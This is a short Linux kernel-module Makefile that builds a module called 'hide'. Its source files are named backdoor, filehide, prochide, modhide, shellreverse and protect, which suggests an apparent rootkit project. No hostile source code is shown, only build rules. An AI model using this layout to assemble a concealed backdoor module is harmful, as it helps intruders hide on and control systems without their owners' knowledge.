obj-m := hide.o

hide-objs := ./src/hide.o ./src/fake.o ./src/backdoor.o \
./src/filehide.o ./src/prochide.o ./src/protocolhide.o \
./src/modhide.o ./src/keep.o ./src/shellreverse.o \
./src/protect.o

cc = gcc -Wall
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
